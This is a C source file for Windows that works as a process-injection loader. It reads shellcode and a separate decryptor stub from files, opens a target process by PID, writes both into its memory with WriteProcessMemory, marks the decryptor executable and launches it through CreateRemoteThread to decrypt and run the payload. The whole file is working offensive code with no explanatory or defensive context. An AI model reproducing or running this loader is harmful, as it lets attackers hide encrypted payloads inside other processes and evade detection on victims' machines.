#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

PVOID ReadFileBytes( PCHAR FilePath, SIZE_T* SzFile ) {

    FILE* file          = NULL;
    size_t bytesRead = 0;
    PVOID buffer     = NULL;
    DWORD length      = 0;
    
    file = fopen( FilePath, "rb" );

    if ( !file ) {
        return NULL;
    }

    fseek( file, 0, SEEK_END );
    length = ftell( file );
    fseek( file, 0, SEEK_SET ); 

    buffer = malloc( length );

    if ( !buffer ) {
        return NULL;
    }

    bytesRead = fread( buffer, 1, length, file );

    if ( bytesRead != length ) {
        free( buffer );
        fclose( file );
        return NULL;
    }

    fclose(file);

    if ( SzFile ) {
        *SzFile = length;
    }
    return buffer;
}

void main( int argc, char* argv[] ) {
    
    PBYTE  shellcode        = NULL;
    PBYTE  pRemoteShellcode = NULL;
    PBYTE  pRemoteDecryptor = NULL;
    PBYTE  decryptor        = NULL;
    SIZE_T  szShellcode     = 0;
    SIZE_T  szDecryptor     = 0;
    PCHAR  shellcode_file   = NULL;
    PCHAR  decryptor_file   = NULL;
    DWORD  target_pid       = 0;
    HANDLE hProcess         = NULL;
    DWORD  OldProtect       = 0;
    HANDLE hThread          = NULL;
    
    if ( argc != 4 ) {
        printf( "Usage: %s shellcode_file decryptor_file target_pid\n", argv[0] );
        return;
    }

    shellcode_file = argv[1];
    decryptor_file = argv[2];
    target_pid     = atoi( argv[3] );
    
    printf( "Target PID: %d\n", target_pid );

    shellcode = ReadFileBytes( shellcode_file, &szShellcode );
    if ( !shellcode ) {
        printf( "Error reading shellcode file\n" );
        return;
    }
    
    decryptor = ReadFileBytes( decryptor_file, &szDecryptor );
    if ( !decryptor ) {
        printf( "Error reading decryptor file\n" );
        return;
    }
    
    hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, target_pid );
    if ( !hProcess ) {
        printf( "Error obtaining handle to target process: %d\n", GetLastError() );
        return;
    }
    
    pRemoteShellcode = VirtualAllocEx( hProcess, NULL, szShellcode + sizeof(SIZE_T), MEM_COMMIT, PAGE_READWRITE );
    if ( !pRemoteShellcode ) {
        printf( "Error allocating memory for shellcode to target process: %d\n", GetLastError() );
        return;
    }
    
    if ( !WriteProcessMemory( hProcess, pRemoteShellcode, &szShellcode, sizeof(SIZE_T), NULL ) ) {
        printf( "Error writing shellcode to target process: %d\n", GetLastError() );
        return;
    }
    if ( !WriteProcessMemory( hProcess, pRemoteShellcode + sizeof(SIZE_T), shellcode, szShellcode, NULL ) ) {
        printf( "Error writing shellcode to target process: %d\n", GetLastError() );
        return;
    }
    
    pRemoteDecryptor = VirtualAllocEx( hProcess, NULL, szDecryptor, MEM_COMMIT, PAGE_READWRITE );
    if ( !pRemoteDecryptor ) {
        printf( "Error allocating memory for decryptor to target process: %d\n", GetLastError() );
        return;
    }
    
    if ( !WriteProcessMemory( hProcess, pRemoteDecryptor, decryptor, szDecryptor, NULL ) ) {
        printf( "Error writing decryptor to target process: %d\n", GetLastError() );
        return;
    }
    
    if( !VirtualProtectEx( hProcess, pRemoteDecryptor, szDecryptor, PAGE_EXECUTE_READ, &OldProtect ) ) {
        printf( "Error protecting decryptor to executeable in target process: %d\n", GetLastError() );
        return;
    }
    
    hThread         = CreateRemoteThread( hProcess, NULL, 0, pRemoteDecryptor, pRemoteShellcode, 0, NULL );
    if ( !hThread ){
        printf( "Error creating thread in target process: %d\n", GetLastError() );
        return;
    }
    
    WaitForSingleObject( hThread, INFINITE );
    printf( "Thread has finished execution!\n" );

}